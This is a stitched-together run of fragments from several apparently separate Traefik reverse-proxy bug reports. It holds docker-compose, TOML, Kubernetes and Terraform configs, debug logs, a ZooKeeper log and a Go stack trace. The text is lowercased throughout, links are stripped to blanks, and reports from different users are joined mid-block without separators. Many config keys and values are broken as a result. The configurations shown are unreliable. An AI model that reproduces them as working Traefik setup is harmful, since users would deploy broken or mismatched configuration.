version: \'3.1\' services: traefik: image: traefik:v1.5.0-rc2-alpine ports: - "80:80" - "443:443" - "8080:8080" networks: - distributed - consul volumes: - /var/run/docker.sock:/var/run/docker.sock deploy: mode: replicated labels: traefik.enable: "true" traefik.port: "8080" traefik.backend: "traefik" traefik.frontend.rule: "host:traefik.example.work" traefik.docker.network: "traefik_distributed" command: - "--consul" - "--consul.endpoint=consul.example.org:8500" networks: distributed: driver: overlay consul: external: name: consul_consul_distributed
``` ### note for the record, i finally solved the segfault by changing `storage` to `storagefile` (at least i think it's what solved it) and by playing with what was stored in consul
traefik host: ubuntu 16.04
consul agent on host: tested both 0.7.4 and 1.0.1 with same result ```toml
traefiklogsfile = "/var/log/traefik/traefik.log"
checknewversion = false
providersthrottleduration = "5s"
loglevel = "info" defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [web]
address = ":8080" [consulcatalog]
constraints = ["tag==environment:dev","tag==lb_id:external-api01"]
watch = true
endpoint = "127.0.0.1:8500"
``` the consul service is registered with the following tags:
{ "service": { "checks": [ { "http": " ", "interval": "3s" } ], "name": "services-external-api-dev-proddev-playapi", "port": 80, "tags": [ "environment:dev", "traefik.frontend.rule=host:play-api-aws.dev.domain.com;pathprefixstrip: /play/1", "traefik.frontend.entrypoints=http", "traefik.enable=true", "traefik.tags=environment:dev,lb_id:external-api01" ] }
traefik running in systemd with the following config:
description=traefik
requires=network-online.target
after=network-online.target [service]
environmentfile=-/etc/sysconfig/traefik
environment=gomaxprocs=2
restart=on-failure
execstart=/usr/local/bin/traefik --configfile=/opt/traefik/config/traefik_config.toml --consulcatalog.domain=domain.com
execreload=/bin/kill -hup $mainpid
killsignal=sigint [install]
wantedby=multi-user.target
``` when running in debug mode, it simply doesn\'t show any signs of listening to consul changes, there\'s only "request logging" going on.
#### traefik.toml ```toml
defaultentrypoints = ["http", "https"]
loglevel = "error" [web]
address = ":8080" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [zookeeper]
endpoint = "zk-svc.zoo.svc.cluster.local:2181" [acme]
email = "redacted@redacted.com"
storage = "traefik/acme/account"
entrypoint = "https"
onhostrule = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) #### traefik storeconfig output ```
traefik storeconfig --debug --configfile=/config-map/traefik.toml
2017/12/08 14:24:47 storing configuration: {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","loglevel":"error","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":null},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":null}},"cluster":null,"constraints":[],"acme":{"email":"redacted@redacted.com","domains":null,"storage":"traefik/acme/account","storagefile":"","ondemand":false,"onhostrule":true,"caserver":"","entrypoint":"https","dnsprovider":"","delaydontcheckdns":0,"acmelogging":false,"tlsconfig":null},"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"docker":null,"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null,"debug":false,"currentconfigurations":null,"stats":null,"statsrecorder":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":{"watch":true,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"zk-svc.zoo.svc.cluster.local:2181","prefix":"/traefik","tls":null,"username":"","password":""},"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}
2017/12/08 14:24:47 connected to 10.35.240.104:2181
2017/12/08 14:24:47 authenticated: id=99138071782883356, timeout=30000
2017/12/08 14:24:47 re-submitting `0` credentials after reconnect
2017/12/08 14:24:47 error running traefik: zk: unknown error
``` #### snip of the zookeeper log output ```
2017-12-08 14:24:47,624 [myid:3] - info [processthread(sid:3 cport:-1)::preprequestprocessor@648] - got user-level keeperexception when processing sessionid: type:setdata cxid: zxid: txntype:-1 reqpath:n/a error path://traefik/accesslogsfile error:keepererrorcode = badarguments for //traefik/accesslogsfile 2017-12-08 14:24:47,624 [myid:3] - info [processthread(sid:3 cport:-1)::preprequestprocessor@514] - invalid path //traefik/accesslogsfile with session , reason: invalid path string "//traefik/accesslogsfile" caused by empty node name specified @1 2017-12-08 14:24:47,622 [myid:3] - info [processthread(sid:3 cport:-1)::preprequestprocessor@648] - got user-level keeperexception when processing sessionid: type:create cxid: zxid: txntype:-1 reqpath:n/a error path://traefik error:keepererrorcode = badarguments for //traefik 2017-12-08 14:24:47,622 [myid:3] - info [processthread(sid:3 cport:-1)::preprequestprocessor@514] - invalid path //traefik with session , reason: invalid path string "//traefik" caused by empty node name specified @1 2017-12-08 14:24:47,620 [myid:3] - info [processthread(sid:3 cport:-1)::preprequestprocessor@648] - got user-level keeperexception when processing sessionid: type:create cxid: zxid: txntype:-1 reqpath:n/a error path:/ error:keepererrorcode = nodeexists for / 2017-12-08 14:28:59,996 [myid:1] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:nioservercnxn@1044] - closed socket connection for client /10.32.8.30:50904 which had sessionid endofstreamexception: unable to read additional data from client sessionid , likely client has closed socket at org.apache.zookeeper.server.nioservercnxn.doio(nioservercnxn.java:239) at org.apache.zookeeper.server.nioservercnxnfactory.run(nioservercnxnfactory.java:203) at java.lang.thread.run(thread.java:748) 2017-12-08 14:28:59,996 [myid:1] - warn [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:nioservercnxn@368] - caught end of stream exception 2017-12-08 14:28:59,663 [myid:1] - info [commitprocessor:1:zookeeperserver@687] - established session with negotiated timeout 30000 for client /10.32.8.30:50904 2017-12-08 14:28:59,660 [myid:1] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@942] - client attempting to establish new session at /10.32.8.30:50904 2017-12-08 14:28:59,659 [myid:1] - warn [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@896] - connection request from old client /10.32.8.30:50904; will be dropped if server is in r-o mode 2017-12-08 14:28:59,658 [myid:1] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:nioservercnxnfactory@192] - accepted socket connection from /10.32.8.30:50904
i used 1.4.2 roquefort
i made some try with new new version 1.5.x and security headers, but not works
traefik 1.4.5
consul 1.0.0 version: v1.4.5
codename: roquefort
go version: go1.9.2
built: 2017-12-06_10:16:48am
os/arch: linux/amd64
[entrypoints] [entrypoints.http] address = ":80" [mesos]
endpoint = "zk://zoo1:2181/mesos"
watch = true
domain = "mesos"
filename = "/mnt/mesos/sandbox/mesos.tmpl"
ipsources = "host"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "server.crt" keyfile = "server.key" # enable docker configuration backend
endpoint = "unix:///var/run/docker.sock"
domain = "guidewire.com"
watch = true
exposedbydefault = false # enable consul catalog configuration backend
[consulcatalog]
endpoint = "fleet-staging:8500"
domain = "deployment.fleet-staging.guidewire.com"
exposedbydefault = true
prefix = "traefik" ``` *docker-compose.yml* ```yml
version: \'2\' services: proxy: image: dtr.guidewire.com/devops/traefik:1.5.0-rc2-guidewire-ssl command: --docker --docker.domain=docker.localhost --loglevel=debug restart: always networks: - webgateway ports: - "80:80" - "443:443" - "8080:8080" volumes: - /var/run/docker.sock:/var/run/docker.sock - /opt/fleet/server/traefik.toml:/traefik.toml batch: image: harbor.guidewire.com/fleet/fleet-server:0.2.5-batch restart: always networks: - webgateway labels: - "traefik.backend=api" - "traefik.frontend.rule=pathprefixstrip:/batch" - "traefik.frontend.redirect=https" - "traefik.port=5001" environment: - spring_profiles_active=staging web: image: harbor.guidewire.com/fleet/fleet-server:0.2.5-web restart: always networks: - webgateway labels: - "traefik.backend=web" - "traefik.frontend.rule=pathprefix:/" - "traefik.frontend.redirect=https" - "traefik.port=5000" environment: - spring_profiles_active=staging networks: webgateway: driver: bridge
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2017-12-07t16:41:37z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":[{"certfile":"server.crt","keyfile":"server.key"}],"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":{"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"docker.localhost","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":false},"file":null,"marathon":null,"consul":null,"consulcatalog":{"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"fleet-staging:8500","domain":"deployment.fleet-staging.guidewire.com","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{.servicename}}.{{.domain}}"},"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":null,"metrics":null,"ping":null}" time="2017-12-07t16:41:37z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2017-12-07t16:41:37z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2017-12-07t16:41:37z" level=debug msg="add certificate for domains *.guidewire.com*.guidewire.com,*.guidewire.com,guidewire.com" time="2017-12-07t16:41:37z" level=info msg="starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"docker.localhost","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":false}" time="2017-12-07t16:41:37z" level=info msg="starting provider *consul.catalogprovider {"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"fleet-staging:8500","domain":"deployment.fleet-staging.guidewire.com","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{.servicename}}.{{.domain}}"}" time="2017-12-07t16:41:37z" level=info msg="starting server on :80" time="2017-12-07t16:41:37z" level=info msg="starting server on :443" time="2017-12-07t16:41:37z" level=debug msg="provider connection established with docker 17.06.2-ce (api 1.30)" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.entrypoints labels" time="2017-12-07t16:41:37z" level=debug msg="could not load traefik.frontend.auth.basic labels" time="2017-12-07t16:41:37z" level=debug msg="fetching service" service=service-devops-hello-fleet-backend time="2017-12-07t16:41:37z" level=debug msg="validation of load balancer method for backend backend-api failed: invalid load-balancing method \'\'
using default method wrr." time="2017-12-07t16:41:37z" level=debug msg="validation of load balancer method for backend backend-web failed: invalid load-balancing method \'\'
using default method wrr." time="2017-12-07t16:41:37z" level=debug msg="configuration received from provider docker: {"backends":{"backend-api":{"servers":{"server-server_batch_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}},"backend-web":{"servers":{"server-server_web_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-pathprefix-0":{"entrypoints":["http","https"],"backend":"backend-web","routes":{"route-frontend-pathprefix-0":{"rule":"pathprefix:/"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{},"redirect":"https"},"frontend-pathprefixstrip-batch-1":{"entrypoints":["http","https"],"backend":"backend-api","routes":{"route-frontend-pathprefixstrip-batch-1":{"rule":"pathprefixstrip:/batch"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{},"redirect":"https"}}}" time="2017-12-07t16:41:37z" level=debug msg="creating frontend frontend-pathprefix-0" time="2017-12-07t16:41:37z" level=debug msg="wiring frontend frontend-pathprefix-0 to entrypoint http" time="2017-12-07t16:41:37z" level=debug msg="creating route route-frontend-pathprefix-0 pathprefix:/" time="2017-12-07t16:41:37z" level=debug msg="creating backend backend-web" time="2017-12-07t16:41:37z" level=debug msg="creating load-balancer wrr" time="2017-12-07t16:41:37z" level=debug msg="creating server server-server_web_1 at with weight 0" time="2017-12-07t16:41:37z" level=error msg="error in go routine: runtime error: invalid memory address or nil pointer dereference" goroutine 13 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 +
github.com/containous/traefik/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:139 +
panic( , ) /usr/local/go/src/runtime/panic.go:491 +
github.com/containous/traefik/server.(*server).buildredirect( , , , , , , , , , ) /go/src/github.com/containous/traefik/server/server.go:1314 +
github.com/containous/traefik/server.(*server).loadconfig( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:1136 +
github.com/containous/traefik/server.(*server).loadconfiguration( , , , ) /go/src/github.com/containous/traefik/server/server.go:434 +
github.com/containous/traefik/server.(*server).listenconfigurations( , ) /go/src/github.com/containous/traefik/server/server.go:418 +
github.com/containous/traefik/server.(*server).start.func2( ) /go/src/github.com/containous/traefik/server/server.go:198 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
gracetimeout = "10s"
checknewversion = false
loglevel = "debug"
providersthrottleduration = "2s"
idletimeout = "180s"
maxidleconnsperhost = 200
insecureskipverify = true
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/certs/tonicfordev.com.crt" keyfile = "/etc/ssl/certs/tonicfordev.com.key"
[web] address = ":8080"
[docker] domain = "docker.local" watch = true exposedbydefault = false endpoint = "unix:///var/run/docker.sock"
<!-- "labels": { "maintainer": "nginx docker maintainers <docker-maint@nginx.com>", "traefik.backend": "ent1.ent1_nginx", "traefik.backend.loadbalancer.method": "wrr", "traefik.enable": "true", "traefik.frontend.entrypoints": "http,https", "traefik.frontend.rule": "host:my.ent1.tonicfordev.com, my.ent1.tonicforhealth.com", "traefik.http.frontend.entrypoints": "http", "traefik.http.port": "80", "traefik.http.protocol": "http", "traefik.https.frontend.entrypoints": "https", "traefik.https.port": "443", "traefik.https.protocol": "https" }, "stopsignal": "sigterm" },
--> traefik creates backend but doesn configure any backend settings for appropriate frontends.
in version 1.4.2 everything is fine
<img width="1011" alt="1_4_2" src=" ">
<img width="994" alt="1_4_5" src=" ">
{ "lifecycle": null, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "loglevel": "error", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": ""
``` sample [dockerfile]( using healthcheck
a kubernets daemonset with the following spec ```yaml
containers:
- image: "traefik:v1.5.0-rc1" name: traefik-ingress-lb imagepullpolicy: ifnotpresent ports: # http (only allowed to do https redirection) - containerport: 80 hostport: 80 # main port https - containerport: 443 hostport: 443 # traefik ihm / health - containerport: 8080 hostport: 8080 livenessprobe: httpget: path: /health port: 8080 scheme: https initialdelayseconds: 30 timeoutseconds: 2 securitycontext: privileged: true args: - --entrypoints=name:https address::443 tls:/ssl/dacert.crt,/ssl/dacert.key - --entrypoints=name:http address::80 redirect.entrypoint:https - --defaultentrypoints=http,https - --kubernetes - --accesslogsfile=/log/traefik-access.log - --api - --entrypoints=name:traefik address::8080 tls:/ssl/dacert.crt,/ssl/dacert.key
{ "gracetimeout": 10000000000, "debug": true, "checknewversion": true, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "loglevel": "error", "entrypoints": { "http": { "network": "", "address": ":80", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "network": "", "address": ":443", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "https", "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "", "tls": null, "exposedbydefault": true, "usebindportip": false, "swarmmode": false }, "file": null, "web": { "address": ":8080", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null, "debug": false, "currentconfigurations": null, "stats": null, "statsrecorder": null }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/etc/traefik/traefik.toml"
applying the following configuration via terraform: ```tf
labels { "traefik.frontend.auth.basic" = "${var.basic_auth}" "traefik.port" = 5050 "traefik.enable" = "true" "traefik.frontend.headers.ssltemporaryredirect" = "true" "traefik.frontend.headers.stsseconds" = "2592000" "traefik.frontend.headers.stsincludesubdomains" = "false" "traefik.frontend.headers.contenttypenosniff" = "true" "traefik.frontend.headers.browserxssfilter" = "true" "traefik.frontend.headers.referrerpolicy" = "no-referrer" "traefik.frontend.headers.customresponseheaders" = "x-powered-by:allomancy,x-server:blackbox" }
i'm applying the same header via the file backend for another frontend: ```toml
[frontends.scan.headers] sslredirect = true ssltemporaryredirect = true stsseconds = 2592000 framedeny = true contenttypenosniff = true browserxssfilter = true referrerpolicy = "no-referrer"
``` and that doesn't give an error
i get the same error if i try to apply the following xfo header: `"allow-from "` removing the xfo and the referrer policy from the container tags fixes the issue
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-11-29t20:45:37z" level=error msg="near line 624 (last key parsed \'frontends.frontend-host-hostname.headers.referrerpolicy\'): expected value but found "no" instead" ```
tested on windows and mac ```toml
################################################################
# global configuration
################################################################ # enable debug mode
# default: false
debug = true # traefik logs file
# if not defined, logs to stdout
# traefiklogsfile = "log/traefik.log" # log level
# default: "error" loglevel = "debug" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["http", "https"] # entrypoints definition
[entrypoints]
[entrypoints.http]
address = ":8000"
[entrypoints.logs]
address = ":9000" # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
# [accesslog] # sets the file path for the access log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "/path/to/log/log.txt" # format is either "json" or "common".
# default: "common"
# format = "common" ################################################################
# web configuration backend
################################################################
[metrics] # to enable traefik to export internal metrics to prometheus [metrics.prometheus] # name of the related entry point # # optional # default: "traefik" # entrypoint = "logs" # enable web configuration backend
# api definition
[api] entrypoint = "logs" # enabled dashboard # # optional # default: true # dashboard = true # enable more detailed statistics
[api.statistics] # number of recent errors logged
# # default: 10 # recenterrors = 10
debug = true
checknewversion = true loglevel = "error" defaultentrypoints = ["http","https"] [accesslog] [web]
# address = "127.0.0.1:8080" readonly = true [web.auth.basic] users = ["xxx"] [web.metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "xxx"
watch = true
exposedbydefault = false [acme]
email = "xxx"
storage = "acme.json"
entrypoint = "https"
onhostrule = true [[acme.domains]] main = "xxx" sans = ["yyy"] [file]
filename = "/static.toml"
watch=true ``` ### if applicable, please paste the log output in debug mode (`--debug` switch) i see this in the logs of traefik: ``` traefik | time="2017-11-23t22:07:03z" level=debug msg="provider event received {status:die id:54254cf6ec0b09cf05dbe7040d8a18a46578ea60b0e817842f9b949c7cbf8b0a from:bitnami/dokuwiki:latest type:container action:die actor:{id:54254cf6ec0b09cf05dbe7040d8a18a46578ea60b0e817842f9b949c7cbf8b0a attributes:map[traefik.port:80 com.docker.compose.container-number:2 name:doku_dokuwiki_2 traefik.enable:true com.docker.compose.config-hash:f1af6c6d166ecd02086e4357fca2d94071b99badcb197a46d83ed08f19cf3ff0 traefik.backend:dokuwiki traefik.frontend.rule:pathprefixstrip:/wiki maintainer:bitnami <containers@bitnami.com> com.docker.compose.oneoff:false com.docker.compose.project:doku exitcode:0 traefik.docker.network:web com.docker.compose.service:dokuwiki com.docker.compose.version:1.8.0 image:bitnami/dokuwiki:latest]} scope:local time:1511474823 timenano:1511474823821285998}" traefik | time="2017-11-23t22:07:04z" level=debug msg="validation of load balancer method for backend backend-dokuwiki failed: invalid load-balancing method \'\'
using default method wrr." traefik | time="2017-11-23t22:07:04z" level=debug msg="configuration received from provider docker: {"backends":{"backend-dokuwiki":{"servers":{"server-doku_dokuwiki_1":{"url":" ","weight":0},"server-doku_dokuwiki_2":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}, [...snip, contains my other docker containers...] "backend":"backend-dokuwiki","routes":{"route-frontend-pathprefixstrip-wiki":{"rule":"pathprefixstrip:/wiki"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}" traefik | time="2017-11-23t22:07:04z" level=debug msg="last docker config received more than 2s, ok" [snip, other services] traefik | time="2017-11-23t22:07:04z" level=debug msg="creating frontend frontend-pathprefixstrip-wiki" traefik | time="2017-11-23t22:07:04z" level=debug msg="wiring frontend frontend-pathprefixstrip-wiki to entrypoint http" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating route route-frontend-pathprefixstrip-wiki pathprefixstrip:/wiki" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating backend backend-dokuwiki" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating load-balancer wrr" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating server server-doku_dokuwiki_1 at with weight 0" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating server server-doku_dokuwiki_2 at with weight 0" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating retries max attempts 2" traefik | time="2017-11-23t22:07:04z" level=debug msg="wiring frontend frontend-pathprefixstrip-wiki to entrypoint https" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating route route-frontend-pathprefixstrip-wiki pathprefixstrip:/wiki" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating backend backend-dokuwiki" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating load-balancer wrr" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating server server-doku_dokuwiki_1 at with weight 0" traefik | time="2017-11-23t22:07:04z" level=debug msg="creating server server-doku_dokuwiki_2 at with weight 0"
traefik | time="2017-11-23t22:07:04z" level=debug msg="creating retries max attempts 2" ``` it looks like traefik still sees the second instance of dokuwiki, and tries to map it to ` `
i have a suspicion that it is the fault of the configuration that docker shows (the json still contains the second instance), but i don't know how traefik retrieves that config.
# docker swarm on debian
![web-ui-1 4 1](
![web-ui-1 4 3](
ubuntu 16.04, docker-ce 17.09.0-ce, packet.net **toml** ### if applicable, please paste the log output in debug mode (`--debug` switch) you can see above ### ways to resolute this **1)** if i leave this alone, it takes between 3-24 hours and traefik fix itself
but it really random and totally not production grade
**2)** when i
- shutdown **stupendous**
- restart traefik docker stack
- wait for traefik to be alive
- start the service **stupendous**
- i all good until i have to stop and re-create a new service
### conclusion i l be prompt to test your suggestions or even to jump on team viewer
thank you for this amazing piece of software and i hope i can contribute to making it even better! cheers!
[pascal]( ps: docker service ls <img width="1293" alt="screen shot 2017-11-13 at 7 56 38 pm" src=" ">
defaultentrypoints = ["http"]
loglevel = "warn"
maxidleconnsperhost = 1000 [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " "
``` - --web - --web.metrics - --web.metrics.prometheus - --loglevel=error - --kubernetes - --entrypoints=name:https-proto address::443 proxyprotocol.trustedips:10.66.23.0/24,10.2.0.0/16 - --defaultentrypoints=https-proto
traefiklogsfile = "/var/log/traefik/traefik.log"
checknewversion = false
providersthrottleduration = "5s"
loglevel = "debug" [retry] [forwardingtimeouts]
dialtimeout = "5s"
responseheadertimeout = "10s" defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [web]
address = ":8080" [consulcatalog]
constraints = ["tag==environment:uat","tag==lb_id:external-api01"]
watch = true
endpoint = "127.0.0.1:8500"
exposedbydefault = false
kubernetes 1.8.1, deployed with kube-spray
traefik deployed with helm stable chart.
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key"
[kubernetes]
address = ":8080" [web.auth.basic] users = ["xxxxxxxx:xxxxxxxxxxxx",] [web.metrics.prometheus] buckets = [0.1,0.3,1.2,5.0]
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ``` this was working when first deployed an only 1 item was being proxied (traefik dashboard) it stopped working when i added more things to be proxied or when i turned on prometheus metrics
not sure which.
i'm setting this up via the helm chart in kubernetes
relevant part of the config is: ```toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.http.forwardedheaders] trustedips = ["10.2.0.0/16"] [entrypoints.https] address = ":443" [entrypoints.https.forwardedheaders] trustedips = ["10.2.0.0/16"]
[kubernetes]
``` `10.2.0.0/16` is the ip range of pods within my k8s cluster (kube-proxy based traffic would get routed from this range)
note, the latest stable helm chart does not support `forwardedheaders` yet - i was working on that when i found this problem
### additional info
the reason this appears to be traefik side is i ran `brndnmtthws/nginx-echo-headers` from docker hub with a very basic k8s ingress backed by traefik and i get this back from it when the setup has `ingress.kubernetes.io/whitelist-source-range: "0.0.0.0/0"` regardless of what is in the traefik toml config: ```
get / http/1.1
host: echo-test.obfuscated
user-agent: curl/7.54.0
accept: */*
x-forwarded-for: my_ip_obfuscated, 10.2.12.0
x-forwarded-host: echo-test.obfuscated
x-forwarded-port: 443
x-forwarded-proto: https
x-forwarded-server: traefik-master-traefik-2076230234-bxss6
x-real-ip: 10.2.12.0
accept-encoding: gzip
``` it shows `my_ip_obfuscated` with the correct external source ip address where i hit it, followed by an ip in the range i'm trying to whitelist - this ip varies depending on the request but always in the `10.2.0.0/16` range
if i then set `ingress.kubernetes.io/whitelist-source-range: "my_ip_obfuscated/32"` in the ingress i start to get http 403 from traefik
side note - i also do not see the 403s in the recent errors ui but i do see them in traefik metrics
probably a separate problem.
[entrypoints] [entrypoints.https] address = ":443" [entrypoints.https.tls] clientcafiles = ["certs/platform-ca.crt"] [[entrypoints.https.tls.certificates]] certfile = "certs/server.crt" keyfile = "certs/server.key" [web]
address = ":8080" [consulcatalog]
endpoint = "172.17.0.1:8500"
domain = "service.gemini"
exposedbydefault = false
prefix = "traefik"
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
debug = true
loglevel = "debug" defaultentrypoints = ["http", "https"]
